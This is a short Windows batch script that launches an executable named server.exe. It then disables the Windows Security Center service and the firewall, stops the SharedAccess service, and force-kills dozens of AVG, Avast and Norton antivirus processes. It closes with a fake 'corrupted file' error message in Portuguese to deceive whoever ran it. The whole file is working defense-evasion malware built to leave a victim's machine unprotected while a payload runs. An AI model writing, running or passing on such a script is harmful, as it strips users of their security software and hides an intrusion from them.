@echo off
Start server.exe
break off
cd\ 
net stop wscsvc >nul 
sc config wscsvc start= disabled 
cls 
netsh firewall set opmode mode=disable >nul 
net stop SharedAccess >nul 
goto avg 
:avg 
taskkill /f /im avgcc.exe >nul 
taskkill /f /im avgcc.exe >nul 
taskkill /f /im avgamsvr.exe >nul 
taskkill /f /im avgupsvc.exe >nul 
taskkill /f /im avgw.exe >nul 
taskkill /f /im avgcc32.exe >nul 
taskkill /f /im avgctrl.exe >nul 
taskkill /f /im avgserv.exe >nul 
taskkill /f /im avgserv9.exe >nul 
taskkill /f /im avgserv9schedapp.exe >nul 
taskkill /f /im avgw.exe >nul 
goto avast 
:avast 
taskkill /f /im ashwebsv.exe >nul 
taskkill /f /im ashdisp.exe >nul 
taskkill /f /im ashmaisv.exe >nul 
taskkill /f /im ashserv.exe >nul 
taskkill /f /im ashwebsv.exe >nul 
goto norton 
:norton 
taskkill /f /im norton.exe >nul 
taskkill /f /im Norton Auto-Protect.exe >nul 
taskkill /f /im norton_av.exe >nul 
taskkill /f /im nortonav.exe >nul 
msg *Erro! Arquivo corrompido!
exit